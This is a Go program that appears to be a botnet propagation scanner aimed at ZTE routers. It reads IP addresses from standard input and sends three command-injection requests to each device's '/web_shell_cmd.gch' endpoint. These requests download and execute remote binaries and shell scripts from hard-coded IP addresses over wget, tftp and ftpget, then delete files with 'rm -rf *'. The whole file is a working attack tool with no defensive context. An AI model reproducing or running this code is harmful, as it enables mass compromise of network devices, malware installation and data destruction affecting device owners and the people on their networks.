package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var payload []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Finit.norm&CmdAck=")
var payload2 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F185.172.110.246%2Fmips+-O+%2Fvar%2Ftmp%2Finit.norm&CmdAck=")
var payload3 []byte = []byte(`IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cd+%2Ftmp+%7C%7C+cd+%2Fvar%2Frun+%7C%7C+cd+%2Fmnt+%7C%7C+cd+%2Froot+%7C%7C+cd+%2F%3B+wget+http%3A%2F%2F152.42.212.230%2Fbins.sh%3B+chmod+777+bins.sh%3B+sh+bins.sh%3B+tftp+152.42.212.230+-c+get+tftp1.sh%3B+chmod+777+tftp1.sh%3B+sh+tftp1.sh%3B+tftp+-r+tftp2.sh+-g+152.42.212.230%3B+chmod+777+tftp2.sh%3B+sh+tftp2.sh%3B+ftpget+-v+-u+anonymous+-p+anonymous+-P+21+152.42.212.230+ftp1.sh+ftp1.sh%3B+sh+ftp1.sh%3B+rm+-rf+bins.sh+tftp1.sh+tftp2.sh+ftp1.sh%3B+rm+-rf+*%3B&CmdAck=`)

var wg sync.WaitGroup
var queue []string

func work(ip string) {
	ip = strings.TrimRight(ip, "\r\n")
	fmt.Printf("[ZTE]---> %s\n", ip)
	url := "https://" + ip + "/web_shell_cmd.gch"

	tr := &http.Transport{
		ResponseHeaderTimeout: 5 * time.Second,
		DisableCompression:    true,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}

	_, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload))
	_, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload2))
	_, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload3))

	wg.Done()
}

func main() {
	r := bufio.NewReader(os.Stdin)
	scan := bufio.NewScanner(r)
	for scan.Scan() {
		wg.Add(1)
		go work(scan.Text())
		time.Sleep(2 * time.Millisecond)
	}
	wg.Wait()
}
